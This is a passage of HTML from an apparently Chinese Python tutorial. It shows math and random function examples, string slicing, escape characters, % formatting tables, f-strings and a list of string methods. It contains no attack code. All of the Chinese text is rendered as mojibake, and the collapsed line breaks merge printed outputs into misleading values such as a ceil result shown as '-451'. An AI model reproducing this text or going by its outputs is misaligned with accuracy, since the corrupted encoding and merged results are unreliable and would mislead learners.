string">"éšæœºæ’åºåˆ—è¡¨ : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span>éšæœºæ’åºåˆ—è¡¨ <span class="token punctuation">:</span>  <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"uniform(5, 10) çš„éšæœºæµ®ç‚¹æ•° : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># uniform(5, 10) çš„éšæœºæµ®ç‚¹æ•° :  9.959955410049714</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"uniform(7, 14) çš„éšæœºæµ®ç‚¹æ•° : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># uniform(7, 14) çš„éšæœºæµ®ç‚¹æ•° :  11.843622946237328</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"acos(1) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>acos<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># acos(1) :  0.0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"asin(1) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>asin<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># asin(1) :  1.5707963267948966</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"atan(1) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>atan<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># atan(1) :  0.7853981633974483</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"atan2(10,20) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>atan2<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># atan2(10,20) :  0.4636476090008061</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"cos(2*math.pi) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>cos<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> math<span class="token punctuation">.</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># cos(2*math.pi) :  1.0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hypot(0, 2) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>hypot<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># hypot(0, 2) :  2.0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sin(math.pi/2) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># sin(math.pi/2) :  1.0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"tan(math.pi/4) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>tan<span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># tan(math.pi/4) :  0.9999999999999999</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"degrees(math.pi/4) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>degrees<span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># degrees(math.pi/4) :  45.0</span><span class="token keyword">print</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>radians<span class="token punctuation">(</span><span class="token number">180</span> <span class="token operator">/</span> math<span class="token punctuation">.</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 1.0</span><span class="token keyword">print</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi<span class="token punctuation">)</span><span class="token comment"># 3.141592653589793</span><span class="token keyword">print</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>e<span class="token punctuation">)</span><span class="token comment"># 2.718281828459045</span><span class="token triple-quoted-string string">'''abs(-40) :  40math.ceil(-45.17) :  -451math.exp(-45.17) :  2.4150062132629406e-20math.fabs(-45.17) :  45.17math.floor(-45.17) :  -46math.log(100.12) :  4.6063694665635735math.log10(100.12) :  2.0005208409361854max(80, 100, 1000) :  1000min(80, 100, 1000) :  80math.modf(100.12) :  (0.12000000000000455, 100.0)math.pow(100, 2) :  10000.0pow(100, 2) :  10000round(-100.000056, 3) :  -100.0math.sqrt(100) :  10.0ä» range(100) è¿”å›ä¸€ä¸ªéšæœºæ•° :  22ä»åˆ—è¡¨ä¸­ [1, 2, 3, 5, 9]) è¿”å›ä¸€ä¸ªéšæœºå…ƒç´  :  2ä»å­—ç¬¦ä¸²ä¸­ 'Runoob' è¿”å›ä¸€ä¸ªéšæœºå­—ç¬¦ :  Rrandrange(1,100, 2) :  83randrange(100) :  92random() :  0.2392758950765237random() :  0.7016096413249141éšæœºæ’åºåˆ—è¡¨ :  [16, 5, 20, 10]éšæœºæ’åºåˆ—è¡¨ :  [20, 16, 10, 5]uniform(5, 10) çš„éšæœºæµ®ç‚¹æ•° :  9.96850739092334uniform(7, 14) çš„éšæœºæµ®ç‚¹æ•° :  9.03188249118426acos(1) :  0.0asin(1) :  1.5707963267948966atan(1) :  0.7853981633974483atan2(10,20) :  0.4636476090008061cos(2*math.pi) :  1.0hypot(0, 2) :  2.0sin(math.pi/2) :  1.0tan(math.pi/4) :  0.9999999999999999degrees(math.pi/4) :  45.01.03.1415926535897932.718281828459045'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å­—ç¬¦ä¸²-String"><a href="#å­—ç¬¦ä¸²-String" class="headerlink" title="å­—ç¬¦ä¸²(String)"></a>å­—ç¬¦ä¸²(String)</h2><h3 id="å­—ç¬¦ä¸²æˆªå–æ ¼å¼-1"><a href="#å­—ç¬¦ä¸²æˆªå–æ ¼å¼-1" class="headerlink" title="å­—ç¬¦ä¸²æˆªå–æ ¼å¼"></a>å­—ç¬¦ä¸²æˆªå–æ ¼å¼</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">å˜é‡å<span class="token punctuation">[</span>å¤´ä¸‹æ ‡<span class="token punctuation">:</span>å°¾ä¸‹æ ‡<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»å‰é¢ç´¢å¼•  0 1 2 3 4 â€¦â€¦</p><p>ä»åé¢ç´¢å¼•  -1 -2 -3 -4 -5 â€¦â€¦</p><p>ä»å‰é¢æˆªå– :1 2 3 4:</p><p>ä»åé¢æˆªå– :-4 -3 -2 -1:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># åˆ›å»ºå­—ç¬¦ä¸²</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'test'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># test</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># t</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºæ‰€æœ‰å­—ç¬¦</span><span class="token comment"># test</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºç¬¬ä¸€ä¸ªåˆ°å€’æ•°ç¬¬äºŒä¸ª</span><span class="token comment"># tes</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºç¬¬ä¸‰ä¸ªåˆ°ç¬¬å››ä¸ª</span><span class="token comment"># st</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment"># testtest</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span> <span class="token operator">+</span> <span class="token string">'re'</span><span class="token punctuation">)</span><span class="token comment"># testre</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># t t</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token string">'restart'</span><span class="token punctuation">)</span><span class="token comment"># te restart</span><span class="token comment"># æˆªå–å†æ‹¼æ¥</span><span class="token triple-quoted-string string">'''testttesttessttesttesttestret tte restart'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pythonå­—ç¬¦ä¸²ä¸èƒ½æ”¹å˜ï¼Œè¯¸å¦‚<code>str[n]='?'</code>çš„èµ‹å€¼ä¼šæŠ¥é”™</p><h3 id="è½¬ä¹‰å­—ç¬¦"><a href="#è½¬ä¹‰å­—ç¬¦" class="headerlink" title="è½¬ä¹‰å­—ç¬¦"></a>è½¬ä¹‰å­—ç¬¦</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># è½¬ä¹‰å­—ç¬¦</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test'</span> \      <span class="token operator">+</span> <span class="token string">'test'</span><span class="token punctuation">)</span>  <span class="token comment"># \ç»­è¡Œ</span><span class="token comment"># testtest</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">)</span>  <span class="token comment"># åæ–œæ </span><span class="token comment"># \</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">)</span>  <span class="token comment"># å•å¼•å·</span><span class="token comment"># '</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\"'</span><span class="token punctuation">)</span>  <span class="token comment"># åŒå¼•å·</span><span class="token comment"># "</span><span class="token comment"># print('\a')  # å“é“ƒ</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test \btest'</span><span class="token punctuation">)</span>  <span class="token comment"># é€€æ ¼</span><span class="token comment"># testtest</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\000'</span><span class="token punctuation">)</span>  <span class="token comment"># ç©º</span><span class="token comment"># </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'1\n1'</span><span class="token punctuation">)</span>  <span class="token comment"># æ¢è¡Œ</span><span class="token comment"># 1</span><span class="token comment"># 1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test\vtest'</span><span class="token punctuation">)</span>  <span class="token comment"># çºµå‘åˆ¶è¡¨ç¬¦</span><span class="token comment">#testtest</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test\ttest'</span><span class="token punctuation">)</span>  <span class="token comment"># æ¨ªå‘åˆ¶è¡¨ç¬¦</span><span class="token comment"># testtest</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test eee\r11  33'</span><span class="token punctuation">)</span>  <span class="token comment"># \råé¢æ›¿æ¢å‰é¢</span><span class="token comment"># 11  33</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test\ftest'</span><span class="token punctuation">)</span>  <span class="token comment"># æ¢é¡µ</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\666'</span><span class="token punctuation">)</span>  <span class="token comment"># 8è¿›åˆ¶</span><span class="token comment"># z</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x33'</span><span class="token punctuation">)</span>  <span class="token comment"># 16è¿›åˆ¶</span><span class="token comment"># 3</span><span class="token triple-quoted-string string">'''testtest\'"testtest 11testtesttesttest11  33testtestÆ¶3'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¿ç®—ç¬¦-1"><a href="#è¿ç®—ç¬¦-1" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># è¿ç®—ç¬¦</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'2'</span> <span class="token operator">+</span> <span class="token string">'rr'</span><span class="token punctuation">)</span>  <span class="token comment"># è¿æ¥ç¬¦</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test'</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># é‡å¤ç¬¦</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># ç´¢å¼•ç¬¦</span><span class="token comment"># in not in æˆå‘˜è¿ç®—ç¬¦</span>a <span class="token operator">=</span> <span class="token string">'hahah'</span><span class="token keyword">if</span> <span class="token string">'a'</span> <span class="token keyword">in</span> a<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'in'</span><span class="token punctuation">)</span><span class="token keyword">else</span> <span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"not in"</span><span class="token punctuation">)</span><span class="token comment"># %æ ¼å¼æ§åˆ¶ç¬¦</span>    <span class="token triple-quoted-string string">'''2rrtesttestein'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å­—ç¬¦æ ¼å¼åŒ–"><a href="#å­—ç¬¦æ ¼å¼åŒ–" class="headerlink" title="å­—ç¬¦æ ¼å¼åŒ–"></a>å­—ç¬¦æ ¼å¼åŒ–</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"æˆ‘å« %s ä»Šå¹´ %d å²!"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">'å°æ˜'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#æˆ‘å« å°æ˜ ä»Šå¹´ 10 å²!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th align="left">ç¬¦  å·</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">%c</td><td align="left">æ ¼å¼åŒ–å­—ç¬¦åŠå…¶ASCIIç </td></tr><tr><td align="left">%s</td><td align="left">æ ¼å¼åŒ–å­—ç¬¦ä¸²</td></tr><tr><td align="left">%d</td><td align="left">æ ¼å¼åŒ–æ•´æ•°</td></tr><tr><td align="left">%u</td><td align="left">æ ¼å¼åŒ–æ— ç¬¦å·æ•´å‹</td></tr><tr><td align="left">%o</td><td align="left">æ ¼å¼åŒ–æ— ç¬¦å·å…«è¿›åˆ¶æ•°</td></tr><tr><td align="left">%x</td><td align="left">æ ¼å¼åŒ–æ— ç¬¦å·åå…­è¿›åˆ¶æ•°</td></tr><tr><td align="left">%X</td><td align="left">æ ¼å¼åŒ–æ— ç¬¦å·åå…­è¿›åˆ¶æ•°ï¼ˆå¤§å†™ï¼‰</td></tr><tr><td align="left">%f</td><td align="left">æ ¼å¼åŒ–æµ®ç‚¹æ•°å­—ï¼Œå¯æŒ‡å®šå°æ•°ç‚¹åçš„ç²¾åº¦</td></tr><tr><td align="left">%e</td><td align="left">ç”¨ç§‘å­¦è®¡æ•°æ³•æ ¼å¼åŒ–æµ®ç‚¹æ•°</td></tr><tr><td align="left">%E</td><td align="left">ä½œç”¨åŒ%eï¼Œç”¨ç§‘å­¦è®¡æ•°æ³•æ ¼å¼åŒ–æµ®ç‚¹æ•°</td></tr><tr><td align="left">%g</td><td align="left">%få’Œ%eçš„ç®€å†™</td></tr><tr><td align="left">%G</td><td align="left">%f å’Œ %E çš„ç®€å†™</td></tr><tr><td align="left">%p</td><td align="left">ç”¨åå…­è¿›åˆ¶æ•°æ ¼å¼åŒ–å˜é‡çš„åœ°å€</td></tr></tbody></table><table><thead><tr><th align="left">ç¬¦å·</th><th align="left">åŠŸèƒ½</th></tr></thead><tbody><tr><td align="left">*</td><td align="left">å®šä¹‰å®½åº¦æˆ–è€…å°æ•°ç‚¹ç²¾åº¦</td></tr><tr><td align="left">-</td><td align="left">ç”¨åšå·¦å¯¹é½</td></tr><tr><td align="left">+</td><td align="left">åœ¨æ­£æ•°å‰é¢æ˜¾ç¤ºåŠ å·( + )</td></tr><tr><td align="left"><sp></sp></td><td align="left">åœ¨æ­£æ•°å‰é¢æ˜¾ç¤ºç©ºæ ¼</td></tr><tr><td align="left">#</td><td align="left">åœ¨å…«è¿›åˆ¶æ•°å‰é¢æ˜¾ç¤ºé›¶(â€˜0â€™)ï¼Œåœ¨åå…­è¿›åˆ¶å‰é¢æ˜¾ç¤ºâ€™0xâ€™æˆ–è€…â€™0Xâ€™(å–å†³äºç”¨çš„æ˜¯â€™xâ€™è¿˜æ˜¯â€™Xâ€™)</td></tr><tr><td align="left">0</td><td align="left">æ˜¾ç¤ºçš„æ•°å­—å‰é¢å¡«å……â€™0â€™è€Œä¸æ˜¯é»˜è®¤çš„ç©ºæ ¼</td></tr><tr><td align="left">%</td><td align="left">â€˜%%â€™è¾“å‡ºä¸€ä¸ªå•ä¸€çš„â€™%â€™</td></tr><tr><td align="left">(var)</td><td align="left">æ˜ å°„å˜é‡(å­—å…¸å‚æ•°)</td></tr><tr><td align="left">m.n.</td><td align="left">m æ˜¯æ˜¾ç¤ºçš„æœ€å°æ€»å®½åº¦,n æ˜¯å°æ•°ç‚¹åçš„ä½æ•°(å¦‚æœå¯ç”¨çš„è¯)</td></tr></tbody></table><h3 id="ä¸‰å¼•å·"><a href="#ä¸‰å¼•å·" class="headerlink" title="ä¸‰å¼•å·"></a>ä¸‰å¼•å·</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># ä¸‰å¼•å·</span>para_str <span class="token operator">=</span> <span class="token triple-quoted-string string">"""è¿™æ˜¯ä¸€ä¸ªå¤šè¡Œå­—ç¬¦ä¸²çš„å®ä¾‹å¤šè¡Œå­—ç¬¦ä¸²å¯ä»¥ä½¿ç”¨åˆ¶è¡¨ç¬¦TAB ( \t )ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨æ¢è¡Œç¬¦ [ \n ]ã€‚"""</span><span class="token keyword">print</span> <span class="token punctuation">(</span>para_str<span class="token punctuation">)</span><span class="token comment"># è·¨å¤šè¡Œ</span><span class="token triple-quoted-string string">'''è¿™æ˜¯ä¸€ä¸ªå¤šè¡Œå­—ç¬¦ä¸²çš„å®ä¾‹å¤šè¡Œå­—ç¬¦ä¸²å¯ä»¥ä½¿ç”¨åˆ¶è¡¨ç¬¦TAB (  )ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨æ¢è¡Œç¬¦ [  ]ã€‚'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="f-string"><a href="#f-string" class="headerlink" title="f-string"></a>f-string</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># f-string</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'test'</span><span class="token string-interpolation"><span class="token string">f'Hello </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">str</span><span class="token punctuation">}</span></span><span class="token string">'</span></span>  <span class="token comment"># æ›¿æ¢å˜é‡</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>         <span class="token comment"># ä½¿ç”¨è¡¨è¾¾å¼</span>w <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'str'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'var'</span><span class="token punctuation">:</span> <span class="token string">'var'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>w<span class="token punctuation">[</span><span class="token string">"str"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">{</span>w<span class="token punctuation">[</span><span class="token string">"var"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''3test: var'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><table><thead><tr><th align="left">åºå·</th><th align="left">æ–¹æ³•åŠæè¿°</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-capitalize.html">capitalize()</a> å°†å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦è½¬æ¢ä¸ºå¤§å†™</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-center.html">center(width, fillchar)</a> è¿”å›ä¸€ä¸ªæŒ‡å®šçš„å®½åº¦ width å±…ä¸­çš„å­—ç¬¦ä¸²ï¼Œfillchar ä¸ºå¡«å……çš„å­—ç¬¦ï¼Œé»˜è®¤ä¸ºç©ºæ ¼ã€‚</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-count.html">count(str, beg= 0,end=len(string))</a> è¿”å› str åœ¨ string é‡Œé¢å‡ºç°çš„æ¬¡æ•°ï¼Œå¦‚æœ beg æˆ–è€… end æŒ‡å®šåˆ™è¿”å›æŒ‡å®šèŒƒå›´å†… str å‡ºç°çš„æ¬¡æ•°</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-decode.html">bytes.decode(encoding=â€utf-8â€, errors=â€strictâ€)</a> Python3 ä¸­æ²¡æœ‰ decode æ–¹æ³•ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ bytes å¯¹è±¡çš„ decode() æ–¹æ³•æ¥è§£ç ç»™å®šçš„ bytes å¯¹è±¡ï¼Œè¿™ä¸ª bytes å¯¹è±¡å¯ä»¥ç”± str.encode() æ¥ç¼–ç è¿”å›ã€‚</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-encode.html">encode(encoding=â€™UTF-8â€™,errors=â€™strictâ€™)</a> ä»¥ encoding æŒ‡å®šçš„ç¼–ç æ ¼å¼ç¼–ç å­—ç¬¦ä¸²ï¼Œå¦‚æœå‡ºé”™é»˜è®¤æŠ¥ä¸€ä¸ªValueError çš„å¼‚å¸¸ï¼Œé™¤é errors æŒ‡å®šçš„æ˜¯â€™ignoreâ€™æˆ–è€…â€™replaceâ€™</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-endswith.html">endswith(suffix, beg=0, end=len(string))</a> æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä»¥ obj ç»“æŸï¼Œå¦‚æœbeg æˆ–è€… end æŒ‡å®šåˆ™æ£€æŸ¥æŒ‡å®šçš„èŒƒå›´å†…æ˜¯å¦ä»¥ obj ç»“æŸï¼Œå¦‚æœæ˜¯ï¼Œè¿”å› True,å¦åˆ™è¿”å› False.</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-expandtabs.html">expandtabs(tabsize=8)</a> æŠŠå­—ç¬¦ä¸² string ä¸­çš„ tab ç¬¦å·è½¬ä¸ºç©ºæ ¼ï¼Œtab ç¬¦å·é»˜è®¤çš„ç©ºæ ¼æ•°æ˜¯ 8 ã€‚</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-find.html">find(str, beg=0, end=len(string))</a> æ£€æµ‹ str æ˜¯å¦åŒ…å«åœ¨å­—ç¬¦ä¸²ä¸­ï¼Œå¦‚æœæŒ‡å®šèŒƒå›´ beg å’Œ end ï¼Œåˆ™æ£€æŸ¥æ˜¯å¦åŒ…å«åœ¨æŒ‡å®šèŒƒå›´å†…ï¼Œå¦‚æœåŒ…å«è¿”å›å¼€å§‹çš„ç´¢å¼•å€¼ï¼Œå¦åˆ™è¿”å›-1</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-index.html">index(str, beg=0, end=len(string))</a> è·Ÿfind()æ–¹æ³•ä¸€æ ·ï¼Œåªä¸è¿‡å¦‚æœsträ¸åœ¨å­—ç¬¦ä¸²ä¸­ä¼šæŠ¥ä¸€ä¸ªå¼‚å¸¸ã€‚</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isalnum.html">isalnum()</a> å¦‚æœå­—ç¬¦ä¸²è‡³å°‘æœ‰ä¸€ä¸ªå­—ç¬¦å¹¶ä¸”æ‰€æœ‰å­—ç¬¦éƒ½æ˜¯å­—æ¯æˆ–æ•°å­—åˆ™è¿” å› Trueï¼Œå¦åˆ™è¿”å› False</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isalpha.html">isalpha()</a> å¦‚æœå­—ç¬¦ä¸²è‡³å°‘æœ‰ä¸€ä¸ªå­—ç¬¦å¹¶ä¸”æ‰€æœ‰å­—ç¬¦éƒ½æ˜¯å­—æ¯æˆ–ä¸­æ–‡å­—åˆ™è¿”å› True, å¦åˆ™è¿”å› False</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isdigit.html">isdigit()</a> å¦‚æœå­—ç¬¦ä¸²åªåŒ…å«æ•°å­—åˆ™è¿”å› True å¦åˆ™è¿”å› False..</td></tr><tr><td align="left">13</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-islower.html">islower()</a> 